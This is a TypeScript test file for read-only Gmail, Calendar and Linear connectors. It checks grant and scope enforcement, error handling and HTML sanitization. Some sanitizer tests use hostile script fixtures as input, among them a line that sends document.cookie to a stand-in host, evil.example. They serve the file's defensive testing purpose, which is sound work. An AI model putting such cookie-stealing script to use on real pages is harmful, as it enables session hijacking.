import { describe, expect, it } from "vitest";
import { readCalendar, GCAL_SCOPES } from "../src/connectors/calendar";
import { readGmail, GMAIL_SCOPES } from "../src/connectors/gmail";
import { readLinear, LINEAR_SCOPES_LIST } from "../src/connectors/linear";
import { ConnectorError, textFromHtml, type FetchImpl, type ResourceGrant } from "../src/connectors/types";

function base64Url(text: string): string {
  return btoa(text).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function stubFetch(routes: Record<string, { status: number; body: unknown; headers?: Record<string, string> }>): {
  fetch: FetchImpl;
  seen: string[];
} {
  const seen: string[] = [];
  const fetch: FetchImpl = async (url) => {
    seen.push(url);
    for (const [prefix, route] of Object.entries(routes)) {
      if (url.startsWith(prefix)) {
        return new Response(JSON.stringify(route.body), {
          status: route.status,
          headers: { "content-type": "application/json", ...(route.headers ?? {}) },
        });
      }
    }
    return new Response("{}", { status: 404 });
  };
  return { fetch, seen };
}

const gmailGrant: ResourceGrant = {
  connectionId: "conn-gmail",
  accountId: "user@example.com",
  resourceIds: ["INBOX"],
  allowsActions: false,
};

const gmailListing = {
  messages: [{ id: "m1" }, { id: "m2" }],
  nextPageToken: "next-1",
};

function gmailMessage(id: string, html: string) {
  return {
    id,
    threadId: "t1",
    snippet: "snippet here",
    labelIds: ["INBOX"],
    payload: {
      headers: [
        { name: "Subject", value: "Priorities" },
        { name: "From", value: "boss@example.com" },
        { name: "Date", value: "Mon, 21 Sep 2026 08:00:00 +0700" },
      ],
      parts: [
        { mimeType: "text/plain", body: { data: base64Url("Plain body") } },
        { mimeType: "text/html", body: { data: base64Url(html) } },
      ],
    },
  };
}

describe("connector contracts", () => {
  it("reads Gmail inside the granted labels with sanitized bodies", async () => {
    const { fetch, seen } = stubFetch({
      "https://gmail.googleapis.com/gmail/v1/users/me/messages?": { status: 200, body: gmailListing },
      "https://gmail.googleapis.com/gmail/v1/users/me/messages/m1": {
        status: 200,
        body: gmailMessage("m1", "<p>Hello</p><script>steal()</script>"),
      },
      "https://gmail.googleapis.com/gmail/v1/users/me/messages/m2": {
        status: 200,
        body: gmailMessage("m2", "<p>World</p>"),
      },
    });
    const { messages, nextPageToken } = await readGmail(fetch, gmailGrant, "token", {
      accountId: "user@example.com",
      labelIds: ["INBOX"],
      query: "newer_than:1d",
      maxResults: 10,
    });
    expect(messages).toHaveLength(2);
    expect(messages[0]!.record.bodyText).toBe("Plain body");
    expect(messages[0]!.record.bodyText).not.toContain("<");
    expect(messages[0]!.deepLink).toContain("/m1");
    expect(messages[0]!.source).toMatchObject({ provider: "gmail", accountId: "user@example.com" });
    expect(nextPageToken).toBe("next-1");
    expect(seen[0]).toContain("labelIds=INBOX");
  });

  it("sanitizes hostile HTML when no plain part exists", () => {
    expect(textFromHtml('<p>Hi</p><script>fetch("https://evil.example?c="+document.cookie)</script>')).toBe("Hi");
  });

  it("decodes each entity once, so escaped markup stays text", () => {
    expect(textFromHtml("a &amp;lt;b&amp;gt; &amp;amp; c")).toBe("a &lt;b&gt; &amp; c");
    expect(textFromHtml("x &lt;y&gt; &quot;z&quot; &#39;w&#39; &amp; v")).toBe(`x <y> "z" 'w' & v`);
  });

  it("removes scripts and styles whose closing tags carry spaces, attributes or capitals", () => {
    expect(textFromHtml("<p>Hi</p><script>steal()</script >there")).toBe("Hi there");
    expect(textFromHtml("<SCRIPT type=x>steal()</SCRIPT\n foo=bar>ok<style>p{}</style\t>!")).toBe("ok !");
  });

  it("refuses account, label, and bound escapes before any traffic", async () => {
    const { fetch, seen } = stubFetch({});
    await expect(
      readGmail(fetch, gmailGrant, "token", {
        accountId: "someone-else@example.com",
        labelIds: ["INBOX"],
        query: "",
        maxResults: 10,
      }),
    ).rejects.toMatchObject({ code: "forbidden" });
    await expect(
      readGmail(fetch, gmailGrant, "token", {
        accountId: "user@example.com",
        labelIds: ["SENT"],
        query: "",
        maxResults: 10,
      }),
    ).rejects.toMatchObject({ code: "forbidden" });
    await expect(
      readGmail(fetch, gmailGrant, "token", {
        accountId: "user@example.com",
        labelIds: ["INBOX"],
        query: "",
        maxResults: 500,
      }),
    ).rejects.toMatchObject({ code: "forbidden" });
    expect(seen).toEqual([]);
  });

  it("maps provider auth, throttle, and shape failures", async () => {
    const denied = stubFetch({
      "https://gmail.googleapis.com/": { status: 401, body: {} },
    });
    await expect(
      readGmail(denied.fetch, gmailGrant, "bad", {
        accountId: "user@example.com",
        labelIds: ["INBOX"],
        query: "",
        maxResults: 10,
      }),
    ).rejects.toMatchObject({ code: "auth" } satisfies { code: ConnectorError["code"] });

    const throttled = stubFetch({
      "https://gmail.googleapis.com/": { status: 429, body: {}, headers: { "retry-after": "7" } },
    });
    try {
      await readGmail(throttled.fetch, gmailGrant, "token", {
        accountId: "user@example.com",
        labelIds: ["INBOX"],
        query: "",
        maxResults: 10,
      });
      expect.unreachable();
    } catch (error) {
      expect(error).toBeInstanceOf(ConnectorError);
      expect((error as ConnectorError).code).toBe("rate_limited");
      expect((error as ConnectorError).retryAfter).toBe(7);
    }

    const drifted = stubFetch({
      "https://gmail.googleapis.com/gmail/v1/users/me/messages?": { status: 200, body: { messages: [{ noid: 1 }] } },
    });
    await expect(
      readGmail(drifted.fetch, gmailGrant, "token", {
        accountId: "user@example.com",
        labelIds: ["INBOX"],
        query: "",
        maxResults: 10,
      }),
    ).rejects.toMatchObject({ code: "schema" });
  });

  it("reads selected calendars with time zones and cancelled events intact", async () => {
    const { fetch } = stubFetch({
      "https://www.googleapis.com/calendar/v3/calendars/work%40example.com/events": {
        status: 200,
        body: {
          items: [
            {
              id: "e1",
              summary: "Standup",
              status: "confirmed",
              start: { dateTime: "2026-09-22T09:30:00+07:00", timeZone: "Asia/Bangkok" },
              end: { dateTime: "2026-09-22T09:45:00+07:00", timeZone: "Asia/Bangkok" },
              htmlLink: "https://calendar/e1",
            },
            {
              id: "e2",
              summary: "Holiday",
              status: "confirmed",
              start: { date: "2026-09-23" },
              end: { date: "2026-09-24" },
            },
            {
              id: "e3",
              summary: "Dropped 1:1",
              status: "cancelled",
              start: { dateTime: "2026-09-22T10:00:00+07:00" },
              end: { dateTime: "2026-09-22T10:30:00+07:00" },
              recurringEventId: "series-9",
            },
          ],
        },
      },
    });
    const grant: ResourceGrant = {
      connectionId: "conn-cal",
      accountId: "user@example.com",
      resourceIds: ["work@example.com"],
      allowsActions: false,
    };
    const { events } = await readCalendar(fetch, grant, "token", {
      accountId: "user@example.com",
      calendarIds: ["work@example.com"],
      timeMin: "2026-09-22T00:00:00+07:00",
      timeMax: "2026-09-24T00:00:00+07:00",
    });
    expect(events.map((entry) => entry.record.id)).toEqual(["e1", "e2", "e3"]);
    expect(events[0]!.record.timeZone).toBe("Asia/Bangkok");
    expect(events[1]!.record.start).toBe("2026-09-23");
    expect(events[2]!.record.status).toBe("cancelled");
    expect(events[2]!.record.recurringEventId).toBe("series-9");
    await expect(
      readCalendar(fetch, grant, "token", {
        accountId: "user@example.com",
        calendarIds: ["personal@example.com"],
        timeMin: "2026-09-22T00:00:00+07:00",
        timeMax: "2026-09-24T00:00:00+07:00",
      }),
    ).rejects.toMatchObject({ code: "forbidden" });
    await expect(
      readCalendar(fetch, grant, "token", {
        accountId: "user@example.com",
        calendarIds: ["work@example.com"],
        timeMin: "2026-09-24T00:00:00+07:00",
        timeMax: "2026-09-22T00:00:00+07:00",
      }),
    ).rejects.toMatchObject({ code: "forbidden" });
  });

  it("reads Linear projects with exact ids and normalized issues", async () => {
    const seen: string[] = [];
    const fetch: FetchImpl = async (_url, init) => {
      seen.push(String(init?.body ?? ""));
      return new Response(
        JSON.stringify({
          data: {
            issues: {
              nodes: [
                {
                  id: "issue-1",
                  identifier: "GO-12",
                  title: "Ship the brief",
                  priority: 1,
                  updatedAt: "2026-09-21T03:00:00Z",
                  url: "https://linear/GO-12",
                  state: { name: "In Progress" },
                  assignee: { name: "Ann" },
                  project: { id: "ws/proj" },
                },
              ],
            },
          },
        }),
        { status: 200 },
      );
    };
    const grant: ResourceGrant = {
      connectionId: "conn-linear",
      accountId: "workspace-1",
      resourceIds: ["ws/proj"],
      allowsActions: false,
    };
    const { issues } = await readLinear(fetch, grant, "token", {
      accountId: "workspace-1",
      projectIds: ["ws/proj"],
      updatedSince: "2026-09-14T00:00:00Z",
      first: 25,
    });
    expect(issues).toHaveLength(1);
    expect(issues[0]!.record).toMatchObject({ identifier: "GO-12", state: "In Progress", assignee: "Ann" });
    expect(issues[0]!.deepLink).toBe("https://linear/GO-12");
    // The project scope travels server-side in the filter, not in model text.
    expect(seen[0]).toContain("ws/proj");
    await expect(
      readLinear(fetch, grant, "token", {
        accountId: "workspace-1",
        projectIds: ["ws/other"],
        updatedSince: "2026-09-14T00:00:00Z",
        first: 25,
      }),
    ).rejects.toMatchObject({ code: "forbidden" });
  });

  it("requests read-only scopes and nothing wider", () => {
    expect([...GMAIL_SCOPES].every((scope) => scope.includes("readonly"))).toBe(true);
    expect(GMAIL_SCOPES.join(" ")).not.toContain("send");
    expect([...GCAL_SCOPES].every((scope) => scope.includes("readonly"))).toBe(true);
    expect(GCAL_SCOPES.join(" ")).not.toContain("events");
    expect(LINEAR_SCOPES_LIST).toEqual(["read"]);
  });
});
